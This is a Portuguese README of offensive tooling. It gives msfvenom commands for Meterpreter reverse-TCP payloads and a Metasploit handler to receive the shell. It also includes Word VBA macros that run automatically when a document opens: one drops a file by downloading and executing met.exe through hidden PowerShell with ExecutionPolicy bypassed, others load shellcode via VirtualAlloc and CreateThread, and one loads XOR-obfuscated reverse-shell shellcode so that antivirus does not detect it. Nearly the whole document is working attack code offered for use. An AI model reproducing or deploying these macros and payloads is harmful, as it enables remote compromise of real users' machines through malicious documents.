# Modo de uso dos scripst

## Terminal para gerar os códigos:
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f ps1 EXITFUNC=thread | python xor_ps1.py

$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f vbapplication EXITFUNC=thread | python xor_vba.py

$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f csharp EXITFUNC=thread | python xor_csharp.py

```

## Metasploit Framework para receber o shell:

```
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp_rc4; set RC4PASSWORD password; set LHOST 192.168.80.128; set LPORT 443; exploit"
```

## MsgBox

```
' Função utilizada para inicio automático ao abrir arquivo .doc
Sub Document_Open()
 Main
End Sub

' Função utilizada para inicio automático ao abrir arquivo .doc
Sub AutoOpen()
 Main
End Sub

' Início do programa
Sub Main()
 MsgBox ("This is a macro test")
End Sub
```

## Dropper (AV Detect)
```
Sub Main()
    Dim shellCommand As String
    Dim url As String
    Dim destino As String

    ' URL do arquivo malicioso/teste e local onde será salvo (Pasta temporária é o alvo comum)
    url = "http://192.168.80.128/met.exe"
    destino = "smith.exe"

    ' Comando PowerShell: Baixa o arquivo e depois o inicia através do Start-Process
    shellCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
                   "& { (New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & destino & "'); " & _
                   "Start-Process '" & destino & "'; }"

    ' Executa o comando em modo oculto
    Shell shellCommand, vbHide
End Sub

Sub Document_Open()
    Main
End Sub

Sub AutoOpen()
    Main
End Sub
```

## Exibir nome do usuário 

```
#If VBA7 Then
    Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" _
        Alias "GetUserNameA" ( _
        ByVal lpBuffer As String, _
        ByRef nSize As Long _
    ) As Long
#Else
    Private Declare Function GetUserName Lib "advapi32.dll" _
        Alias "GetUserNameA" ( _
        ByVal lpBuffer As String, _
        ByRef nSize As Long _
    ) As Long
#End If

Sub Document_Open()
    Main
End Sub

Sub AutoOpen()
    Main
End Sub

Sub Main()
    Dim resultado As Long
    Dim Buffer As String * 256
    Dim TamanhoBuffer As Long
    TamanhoBuffer = 256

    resultado = GetUserName(Buffer, TamanhoBuffer)
    MsgBox Buffer
End Sub
```

## Abrir calculadora
### Gerando shellcode para abrir calc.exe
```
$ msfvenom -p windows/x64/exec CMD=calc.exe -f vbapplication EXITFUN=thread
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 276 bytes
Final size of vbapplication file: 931 bytes
buf = Array(252,72,131,228,240,232,192,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139,82,24,72,139,82,32,72,139,114,80,72,15,183,74,74,77,49,201,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,139,128,136,0, _
0,0,72,133,192,116,103,72,1,208,80,139,72,24,68,139,64,32,73,1,208,227,86,72,255,201,65,139,52,136,72,1,214,77,49,201,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1,208,102,65,139,12,72,68,139,64,28,73,1, _
208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,87,255,255,255,93,72,186,1,0,0,0,0,0,0,0,72,141,141,1,1,0,0,65,186,49,139,111,135,255,213,187,240,181,162,86,65,186,166,149,189,157,255,213, _
72,131,196,40,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,89,65,137,218,255,213,99,97,108,99,46,101,120,101,0)
```

### Acrescentando o shellcode no código vba para abrir a calculadora
```
'   LPVOID VirtualAlloc(
'       LPVOID lpAddress,
'       SIZE_T dwSize,
'       DWORD flAllocationType,
'       DWORD flProtect
'   );

'   VOID RtlMoveMemory(
'       VOID UNALIGNED *Destination,
'       VOID UNALIGNED *Source,
'       SIZE_T Length
'   );

'   HANDLE CreateThread(
'       LPSECURITY_ATTRIBUTES lpThreadAttributes,
'       SIZE_T dwStackSize,
'       LPTHREAD_START_ROUTINE lpStartAddress,
'       LPVOID lpParameter,
'       DWORD dwCreationFlags,
'       LPDWORD lpThreadId
'   );

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Public Enum ALLOCATION_TYPE
    MEM_COMMIT = &H1000
    MEM_RESERVE = &H2000
End Enum

Sub Document_Open()
    Main
End Sub

Sub AutoOpen()
    Main
End Sub

Sub Main()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long

    ' msfvenom -p windows/x64/exec CMD=calc.exe -f vbapplication EXITFUNC=thread

    buf = Array(252, 72, 131, 228, 240, 232, 192, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 139, 128, 136, 0, _
    0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, _
    208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 87, 255, 255, 255, 93, 72, 186, 1, 0, 0, 0, 0, 0, 0, 0, 72, 141, 141, 1, 1, 0, 0, 65, 186, 49, 139, 111, 135, 255, 213, 187, 224, 29, 42, 10, 65, 186, 166, 149, 189, 157, 255, 213, _
    72, 131, 196, 40, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 89, 65, 137, 218, 255, 213, 99, 97, 108, 99, 46, 101, 120, 101, 0)

    ' lpAddress setado como 0 passa para o kernel escolher o espaço de memória a ser reservado
    ' Ubound pega a quantidade de itens dentro do Array
    ' flAllocationType é setado como 0x3000, operação bitwise or entre 0x1000 e 0x2000
    ' flProtect seta como 0x40 que significa permissões de leitura, escrita e execução
    
    addr = VirtualAlloc(0, UBound(buf), ALLOCATION_TYPE.MEM_COMMIT Or ALLOCATION_TYPE.MEM_RESERVE, &H40)

    For contador = LBound(buf) To UBound(buf)
        data = buf(contador)
        res = RtlMoveMemory(addr + contador, data, 1)
    Next contador

    res = CreateThread(0, 0, addr, 0, 0, 0)

End Sub
```

### Geando Shell reverso no vba
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f vbapplication EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 651 bytes
Final size of vbapplication file: 2199 bytes
buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,72,49,210,101,72,139,82,96,81,86,72,139,82,24,72,139,82,32,72,139,114,80,77,49,201,72,15,183,74,74,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,72,139,82,32,65,81,139,66,60,72,1,208,102,129,120,24, _
11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1,208,139,72,24,68,139,64,32,73,1,208,80,227,86,72,255,201,77,49,201,65,139,52,136,72,1,214,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1, _
208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,75,255,255,255,93,73,190,119,115,50,95,51,50,0,0,65,86,73,137,230,72,129,236,160,1,0,0,73,137,229,73, _
188,2,0,1,187,192,168,80,128,65,84,73,137,228,76,137,241,65,186,76,119,38,7,255,213,76,137,234,104,1,1,0,0,89,65,186,41,128,107,0,255,213,106,10,65,94,80,80,77,49,201,77,49,192,72,255,192,72,137,194,72,255,192,72,137,193,65,186,234,15,223,224,255,213,72,137,199,106,16,65, _
88,76,137,226,72,137,249,65,186,153,165,116,97,255,213,133,192,116,10,73,255,206,117,229,232,31,1,0,0,72,131,236,16,72,137,226,77,49,201,106,4,65,88,72,137,249,65,186,2,217,200,95,255,213,131,248,0,15,142,109,0,0,0,72,131,196,32,94,137,246,129,246,91,170,97,228,76,141,158,0, _
1,0,0,106,64,65,89,104,0,16,0,0,65,88,72,137,242,72,49,201,65,186,88,164,83,229,255,213,72,141,152,0,1,0,0,73,137,223,83,86,80,77,49,201,73,137,240,72,137,218,72,137,249,65,186,2,217,200,95,255,213,72,131,196,32,131,248,0,125,40,88,65,87,89,104,0,64,0,0,65, _
88,106,0,90,65,186,11,47,15,48,255,213,87,89,65,186,117,110,77,97,255,213,73,255,206,233,32,255,255,255,72,1,195,72,41,198,117,179,73,137,254,95,89,65,89,65,86,232,16,0,0,0,201,185,63,63,6,130,37,11,108,248,51,27,126,230,143,216,94,72,49,192,73,137,248,170,254,192,117,251, _
72,49,219,65,2,28,0,72,137,194,128,226,15,2,28,22,65,138,20,0,65,134,20,24,65,136,20,0,254,192,117,227,72,49,219,254,192,65,2,28,0,65,138,20,0,65,134,20,24,65,136,20,0,65,2,20,24,65,138,20,16,65,48,17,73,255,193,72,255,201,117,219,95,65,255,231,88,106,0,89, _
187,224,29,42,10,65,137,218,255,213)
```

### Acrescentando o shellcode no código vba para abrir a calculadora
```
'   LPVOID VirtualAlloc(
'       LPVOID lpAddress,
'       SIZE_T dwSize,
'       DWORD flAllocationType,
'       DWORD flProtect
'   );

'   VOID RtlMoveMemory(
'       VOID UNALIGNED *Destination,
'       VOID UNALIGNED *Source,
'       SIZE_T Length
'   );

'   HANDLE CreateThread(
'       LPSECURITY_ATTRIBUTES lpThreadAttributes,
'       SIZE_T dwStackSize,
'       LPTHREAD_START_ROUTINE lpStartAddress,
'       LPVOID lpParameter,
'       DWORD dwCreationFlags,
'       LPDWORD lpThreadId
'   );

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Public Enum ALLOCATION_TYPE
    MEM_COMMIT = &H1000
    MEM_RESERVE = &H2000
End Enum

Sub Document_Open()
    Main
End Sub

Sub AutoOpen()
    Main
End Sub

Sub Main()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long

    ' msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f vbapplication EXITFUNC=thread

    buf = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 72, 49, 210, 101, 72, 139, 82, 96, 81, 86, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 77, 49, 201, 72, 15, 183, 74, 74, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 72, 139, 82, 32, 65, 81, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 80, 227, 86, 72, 255, 201, 77, 49, 201, 65, 139, 52, 136, 72, 1, 214, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, _
188, 2, 0, 1, 187, 192, 168, 80, 128, 65, 84, 73, 137, 228, 76, 137, 241, 65, 186, 76, 119, 38, 7, 255, 213, 76, 137, 234, 104, 1, 1, 0, 0, 89, 65, 186, 41, 128, 107, 0, 255, 213, 106, 10, 65, 94, 80, 80, 77, 49, 201, 77, 49, 192, 72, 255, 192, 72, 137, 194, 72, 255, 192, 72, 137, 193, 65, 186, 234, 15, 223, 224, 255, 213, 72, 137, 199, 106, 16, 65, _
88, 76, 137, 226, 72, 137, 249, 65, 186, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 73, 255, 206, 117, 229, 232, 31, 1, 0, 0, 72, 131, 236, 16, 72, 137, 226, 77, 49, 201, 106, 4, 65, 88, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 15, 142, 109, 0, 0, 0, 72, 131, 196, 32, 94, 137, 246, 129, 246, 91, 170, 97, 228, 76, 141, 158, 0, _
1, 0, 0, 106, 64, 65, 89, 104, 0, 16, 0, 0, 65, 88, 72, 137, 242, 72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 141, 152, 0, 1, 0, 0, 73, 137, 223, 83, 86, 80, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 72, 131, 196, 32, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, _
88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 32, 255, 255, 255, 72, 1, 195, 72, 41, 198, 117, 179, 73, 137, 254, 95, 89, 65, 89, 65, 86, 232, 16, 0, 0, 0, 201, 185, 63, 63, 6, 130, 37, 11, 108, 248, 51, 27, 126, 230, 143, 216, 94, 72, 49, 192, 73, 137, 248, 170, 254, 192, 117, 251, _
72, 49, 219, 65, 2, 28, 0, 72, 137, 194, 128, 226, 15, 2, 28, 22, 65, 138, 20, 0, 65, 134, 20, 24, 65, 136, 20, 0, 254, 192, 117, 227, 72, 49, 219, 254, 192, 65, 2, 28, 0, 65, 138, 20, 0, 65, 134, 20, 24, 65, 136, 20, 0, 65, 2, 20, 24, 65, 138, 20, 16, 65, 48, 17, 73, 255, 193, 72, 255, 201, 117, 219, 95, 65, 255, 231, 88, 106, 0, 89, _
187, 224, 29, 42, 10, 65, 137, 218, 255, 213)

    ' lpAddress setado como 0 passa para o kernel escolher o espaço de memória a ser reservado
    ' Ubound pega a quantidade de itens dentro do Array
    ' flAllocationType é setado como 0x3000, operação bitwise or entre 0x1000 e 0x2000
    ' flProtect seta como 0x40 que significa permissões de leitura, escrita e execução
    
    addr = VirtualAlloc(0, UBound(buf), ALLOCATION_TYPE.MEM_COMMIT Or ALLOCATION_TYPE.MEM_RESERVE, &H40)

    For contador = LBound(buf) To UBound(buf)
        data = buf(contador)
        res = RtlMoveMemory(addr + contador, data, 1)
    Next contador

    res = CreateThread(0, 0, addr, 0, 0, 0)

End Sub

```

### Shell reverso xoreado
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f vbapplication EXITFUNC=thread | python xor_vba.py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 651 bytes
Final size of vbapplication file: 2199 bytes

======================================================================
   GERADOR VBA MULTI-ARQUITETURA (x86/x64)
======================================================================

' --- SEÇÃO DE COMPILAÇÃO CONDICIONAL PARA 32/64 BITS ---
#If VBA7 Then
    ' Office 2010 ou superior (64-bit e 32-bit com suporte a PtrSafe)
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
    Dim addr As LongPtr
#Else
    ' Versões antigas ou ambiente estritamente 32-bit
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As Long, ByRef sSource As Any, ByVal lLength As Long) As Long
    Private Declare Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As Long
    Dim addr As Long
#End If

Public Enum ALLOC_TYPES
    MEM_COMMIT = &H1000
    MEM_RESERVE = &H2000
End Enum

Sub Document_Open()
    Main
End Sub

Sub AutoOpen()
    Main
End Sub

Sub Main()
    Dim buf As Variant
    Dim data As Long
    Dim key As Byte
    Dim i As Long

    ' Chave XOR: 17
    key = &H11

    buf = Array(237, 89, 146, 245, 225, 249, 221, 17, 17, 17, 80, 64, 80, 65, 67, 64, 71, 89, 32, 195, 116, 89, 154, 67, 113, _
        89, 154, 67, 9, 89, 154, 67, 49, 92, 32, 216, 89, 30, 166, 91, 91, 89, 154, 99, 65, 89, 32, 209, 189, 45, _
        112, 109, 19, 61, 49, 80, 208, 216, 28, 80, 16, 208, 243, 252, 67, 80, 64, 89, 154, 67, 49, 154, 83, 45, 89, _
        16, 193, 119, 144, 105, 9, 26, 19, 30, 148, 99, 17, 17, 17, 154, 145, 153, 17, 17, 17, 89, 148, 209, 101, 118, _
        89, 16, 193, 65, 85, 154, 81, 49, 88, 16, 193, 154, 89, 9, 242, 71, 89, 238, 216, 92, 32, 216, 80, 154, 37, _
        153, 89, 16, 199, 89, 32, 209, 80, 208, 216, 28, 189, 80, 16, 208, 41, 241, 100, 224, 93, 18, 93, 53, 25, 84, _
        40, 192, 100, 201, 73, 85, 154, 81, 53, 88, 16, 193, 119, 80, 154, 29, 89, 85, 154, 81, 13, 88, 16, 193, 80, _
        154, 21, 153, 89, 16, 193, 80, 73, 80, 73, 79, 72, 75, 80, 73, 80, 72, 80, 75, 89, 146, 253, 49, 80, 67, _
        238, 241, 73, 80, 72, 75, 89, 154, 3, 248, 90, 238, 238, 238, 76, 88, 175, 102, 98, 35, 78, 34, 35, 17, 17, _
        80, 71, 88, 152, 247, 89, 144, 253, 177, 16, 17, 17, 88, 152, 244, 88, 173, 19, 17, 16, 170, 209, 185, 65, 145, _
        80, 69, 88, 152, 245, 93, 152, 224, 80, 171, 93, 102, 55, 22, 238, 196, 93, 152, 251, 121, 16, 16, 17, 17, 72, _
        80, 171, 56, 145, 122, 17, 238, 196, 123, 27, 80, 79, 65, 65, 92, 32, 216, 92, 32, 209, 89, 238, 209, 89, 152, _
        211, 89, 238, 209, 89, 152, 208, 80, 171, 251, 30, 206, 241, 238, 196, 89, 152, 214, 123, 1, 80, 73, 93, 152, 243, _
        89, 152, 232, 80, 171, 136, 180, 101, 112, 238, 196, 148, 209, 101, 27, 88, 238, 223, 100, 244, 249, 14, 16, 17, 17, _
        89, 146, 253, 1, 89, 152, 243, 92, 32, 216, 123, 21, 80, 73, 89, 152, 232, 80, 171, 19, 200, 217, 78, 238, 196, _
        146, 233, 17, 30, 159, 124, 17, 17, 17, 89, 146, 213, 49, 79, 152, 231, 144, 231, 74, 187, 112, 245, 93, 156, 143, _
        17, 16, 17, 17, 123, 81, 80, 72, 121, 17, 1, 17, 17, 80, 73, 89, 152, 227, 89, 32, 216, 80, 171, 73, 181, _
        66, 244, 238, 196, 89, 156, 137, 17, 16, 17, 17, 88, 152, 206, 66, 71, 65, 92, 32, 216, 88, 152, 225, 89, 152, _
        203, 89, 152, 232, 80, 171, 19, 200, 217, 78, 238, 196, 89, 146, 213, 49, 146, 233, 17, 108, 57, 73, 80, 70, 72, _
        121, 17, 81, 17, 17, 80, 73, 123, 17, 75, 80, 171, 26, 62, 30, 33, 238, 196, 70, 72, 80, 171, 100, 127, 92, _
        112, 238, 196, 88, 238, 223, 248, 49, 238, 238, 238, 89, 16, 210, 89, 56, 215, 100, 162, 88, 152, 239, 78, 72, 80, _
        72, 80, 71, 249, 1, 17, 17, 17, 216, 168, 46, 46, 23, 147, 52, 26, 125, 233, 34, 10, 111, 247, 158, 201, 79, _
        89, 32, 209, 88, 152, 233, 187, 239, 209, 100, 234, 89, 32, 202, 80, 19, 13, 17, 89, 152, 211, 145, 243, 30, 19, _
        13, 7, 80, 155, 5, 17, 80, 151, 5, 9, 80, 153, 5, 17, 239, 209, 100, 242, 89, 32, 202, 239, 209, 80, 19, _
        13, 17, 80, 155, 5, 17, 80, 151, 5, 9, 80, 153, 5, 17, 80, 19, 5, 9, 80, 155, 5, 1, 80, 33, 0, _
        88, 238, 208, 89, 238, 216, 100, 202, 78, 80, 238, 246, 73, 123, 17, 72, 170, 241, 12, 59, 27, 80, 152, 203, 238, _
        196)

    ' Alocação Dinâmica baseada na arquitetura detectada
    addr = VirtualAlloc(0, UBound(buf) + 1, ALLOC_TYPES.MEM_COMMIT Or ALLOC_TYPES.MEM_RESERVE, &H40)

    For i = LBound(buf) To UBound(buf)
        data = buf(i) Xor key
        RtlMoveMemory addr + i, data, 1
    Next i

    CreateThread 0, 0, addr, 0, 0, 0
End Sub
```

